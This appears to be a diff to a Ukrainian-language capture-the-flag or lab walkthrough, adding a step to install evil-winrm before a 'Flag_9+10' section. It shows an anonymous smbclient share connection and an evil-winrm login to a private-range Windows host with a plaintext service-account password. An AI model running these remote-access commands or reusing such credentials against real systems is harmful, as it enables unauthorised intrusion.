@@ -148,7 +148,12 @@ smbclient //10.10.50.150/Updates -N
 
 ---
 
-## Flag_9+10 — Windows WinRM (з Kali)
+## Flag_9+10 — Windows WinRM (з Operator_station, commador shell)
+
+Встановити evil-winrm якщо нема:
+```
+sudo gem install evil-winrm
+```
 
 ```
 evil-winrm -i 10.10.50.150 -u svc_deploy -p "Deploy@2024!Drone"
